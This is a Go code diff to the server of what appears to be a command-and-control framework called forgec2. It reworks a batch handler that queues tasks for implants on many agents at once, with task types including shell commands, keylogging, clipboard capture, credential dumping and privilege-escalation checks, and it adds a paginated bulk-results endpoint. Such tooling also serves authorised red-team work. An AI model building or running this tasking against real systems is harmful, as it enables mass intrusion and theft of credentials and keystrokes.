@@ -7,6 +7,8 @@ import (
 	"time"
 
 	"github.com/forgec2/forgec2/internal/db"
+	"github.com/forgec2/forgec2/internal/plugin"
+	"github.com/forgec2/forgec2/pkg/protocol"
 	"github.com/gin-gonic/gin"
 )
 
@@ -19,6 +21,10 @@ func (s *Server) handleBulkDeleteAgents(c *gin.Context) {
 	}
 	if err := c.ShouldBindJSON(&req); err != nil || len(req.AgentIDs) == 0 {
 		respondError(c, http.StatusBadRequest, "agent_ids required")
+		return
+	}
+	if len(req.AgentIDs) > 500 {
+		respondError(c, http.StatusBadRequest, "too many agents (max 500)")
 		return
 	}
 
@@ -55,9 +61,9 @@ func (s *Server) handleBatchCommand(c *gin.Context) {
 		AgentIDs []string `json:"agent_ids"`
 		Command  string   `json:"command"`
 		Shell    string   `json:"shell"`
-		TaskType string   `json:"task_type"` // shell, screenshot, upload, download, sleep, keylogger, etc
-		File     string   `json:"file"`      // for upload/download
-		Args     string   `json:"args"`      // additional arguments
+		TaskType string   `json:"task_type"`
+		File     string   `json:"file"`
+		Args     string   `json:"args"`
 	}
 
 	if err := c.ShouldBindJSON(&req); err != nil {
@@ -69,72 +75,96 @@ func (s *Server) handleBatchCommand(c *gin.Context) {
 		respondError(c, http.StatusBadRequest, "no agents selected")
 		return
 	}
+	if len(req.AgentIDs) > 500 {
+		respondError(c, http.StatusBadRequest, "too many agents (max 500)")
+		return
+	}
 
-	// Default task type
 	if req.TaskType == "" {
 		req.TaskType = "shell"
 	}
 
-	taskCount := 0
-	skippedLocked := 0
-	failedCount := 0
+	uniqueIDs := make([]string, 0, len(req.AgentIDs))
+	seen := make(map[string]struct{}, len(req.AgentIDs))
+	for _, id := range req.AgentIDs {
+		if _, exists := seen[id]; !exists {
+			seen[id] = struct{}{}
+			uniqueIDs = append(uniqueIDs, id)
+		}
+	}
 
-	// Batch-load all agents to avoid N+1 queries
 	var existingAgents []db.Implant
-	s.db.Select("id").Where("id IN ?", req.AgentIDs).Find(&existingAgents)
+	s.db.Select("id").Where("id IN ?", uniqueIDs).Find(&existingAgents)
 	existingSet := make(map[string]bool, len(existingAgents))
 	for _, a := range existingAgents {
 		existingSet[a.ID] = true
 	}
 
-	for _, agentID := range req.AgentIDs {
+	// Build all tasks first, then batch-insert in a single DB call
+	tasks := make([]db.Task, 0, len(uniqueIDs))
+	validAgentIDs := make([]string, 0, len(uniqueIDs))
+
+	for _, agentID := range uniqueIDs {
 		if !existingSet[agentID] {
-			failedCount++
 			continue
 		}
 
-		var task *db.Task
-		var err error
-
-		// Create task based on type
-		switch req.TaskType {
-		case "shell":
-			task, err = s.createTask(agentID, "shell", req.Command, req.Shell, "", "", 0, 0)
-		case "screenshot":
-			task, err = s.createTask(agentID, "screenshot", "screenshot", "", "", "", 0, 0)
-		case "keylogger_start":
-			task, err = s.createTask(agentID, "keylogger_start", "keylogger_start", "", "", "", 0, 0)
-		case "keylogger_dump":
-			task, err = s.createTask(agentID, "keylogger_dump", "keylogger_dump", "", "", "", 0, 0)
-		case "keylogger_stop":
-			task, err = s.createTask(agentID, "keylogger_stop", "keylogger_stop", "", "", "", 0, 0)
-		case "clipboard_get":
-			task, err = s.createTask(agentID, "clipboard_get", "clipboard_get", "", "", "", 0, 0)
-		case "creds_dump":
-			task, err = s.createTask(agentID, "creds", "creds_dump", "", "", "", 0, 0)
-		case "privesc_check":
-			task, err = s.createTask(agentID, "privesc_check", "privesc_check", "", "", "", 0, 0)
-		case "sleep":
-			// Args format: "interval,jitter" e.g., "30,20"
-			task, err = s.createTask(agentID, "set_sleep", req.Args, "", "", "", 0, 0)
-		default:
-			task, err = s.createTask(agentID, req.TaskType, req.Command, "", "", "", 0, 0)
-		}
-
-		if err != nil {
-			slog.Error("Batch command: failed to create task", "agent_id", agentID, "err", err)
-			failedCount++
+		// Validate task type once per agent
+		if !IsKnownTaskType(req.TaskType) && !protocol.ValidTaskType(req.TaskType) {
+			slog.Error("Batch command: unknown task type", "type", req.TaskType)
 			continue
 		}
 
-		s.broadcastTaskUpdate(agentID, *task)
-		taskCount++
+		tasks = append(tasks, db.Task{
+			AgentID: agentID,
+			Type:    req.TaskType,
+			Command: req.Command,
+			Shell:   req.Shell,
+			Path:    req.File,
+			Data:    req.Args,
+			Status:  "pending",
+		})
+		validAgentIDs = append(validAgentIDs, agentID)
 	}
 
-	slog.Info("Batch command sent", "count", taskCount, "skipped_locked", skippedLocked, "failed", failedCount, "type", req.TaskType, "command", req.Command)
-	s.LogAuditRecord(c, "batch_command", "agent", "", fmt.Sprintf("%s to %d agents (%d skipped, %d failed)", req.TaskType, taskCount, skippedLocked, failedCount), true, nil)
+	// Batch-insert all tasks in one DB round-trip
+	if err := s.db.CreateInBatches(tasks, 100).Error; err != nil {
+		slog.Error("Batch command: failed to batch-create tasks", "err", err)
+		respondError(c, http.StatusInternalServerError, "failed to create tasks")
+		return
+	}
 
-	// Record in bulk history ring buffer
+	// Post-insert: increment pending counters, fire hooks, broadcast
+	s.agentPendingTasksMu.Lock()
+	for i := range tasks {
+		s.agentPendingTasks[tasks[i].AgentID]++
+	}
+	s.agentPendingTasksMu.Unlock()
+
+	for i := range tasks {
+		if s.pluginManager != nil {
+			taskCopy := tasks[i]
+			go s.pluginManager.ExecuteHook(s.ctx, plugin.Event{
+				Type:      plugin.EventTaskCreated,
+				Timestamp: time.Now(),
+				AgentID:   taskCopy.AgentID,
+				Payload: map[string]interface{}{
+					"task_id":   taskCopy.ID,
+					"task_type": taskCopy.Type,
+					"command":   taskCopy.Command,
+				},
+			})
+		}
+		s.metrics.TasksTotal.Inc()
+		s.broadcastTaskUpdate(tasks[i].AgentID, tasks[i])
+	}
+
+	taskCount := len(tasks)
+	failedCount := len(uniqueIDs) - taskCount
+
+	slog.Info("Batch command sent", "count", taskCount, "failed", failedCount, "type", req.TaskType, "command", req.Command)
+	s.LogAuditRecord(c, "batch_command", "agent", "", fmt.Sprintf("%s to %d agents (%d failed)", req.TaskType, taskCount, failedCount), true, nil)
+
 	user, _ := c.Get("user")
 	operator := fmt.Sprintf("%v", user)
 	s.pushBulkResult(BulkResult{
@@ -142,15 +172,64 @@ func (s *Server) handleBatchCommand(c *gin.Context) {
 		Command:   req.Command,
 		TaskType:  req.TaskType,
 		Created:   taskCount,
-		Skipped:   skippedLocked,
+		Skipped:   0,
 		Failed:    failedCount,
 		Operator:  operator,
 	})
 
 	c.JSON(http.StatusOK, gin.H{
-		"success":        true,
-		"tasks_created":  taskCount,
-		"skipped_locked": skippedLocked,
-		"failed":         failedCount,
+		"success":       true,
+		"tasks_created": taskCount,
+		"failed":        failedCount,
+	})
+}
+
+func (s *Server) handleBulkResults(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+
+	page := 1
+	pageSize := 20
+	if p := c.Query("page"); p != "" {
+		if v, err := fmt.Sscanf(p, "%d", &page); err == nil && v > 0 {
+			// use page
+		}
+	}
+	if ps := c.Query("pageSize"); ps != "" {
+		if v, err := fmt.Sscanf(ps, "%d", &pageSize); err == nil && v > 0 {
+			// use pageSize
+		}
+	}
+	if page < 1 {
+		page = 1
+	}
+	if pageSize < 1 {
+		pageSize = 20
+	}
+	if pageSize > 100 {
+		pageSize = 100
+	}
+
+	s.bulkHistoryMu.Lock()
+	results := make([]BulkResult, len(s.bulkHistory))
+	copy(results, s.bulkHistory)
+	s.bulkHistoryMu.Unlock()
+
+	total := len(results)
+	start := (page - 1) * pageSize
+	if start > total {
+		start = total
+	}
+	end := start + pageSize
+	if end > total {
+		end = total
+	}
+
+	c.JSON(http.StatusOK, gin.H{
+		"results": results[start:end],
+		"total":   total,
+		"page":    page,
+		"page_size": pageSize,
 	})
 }
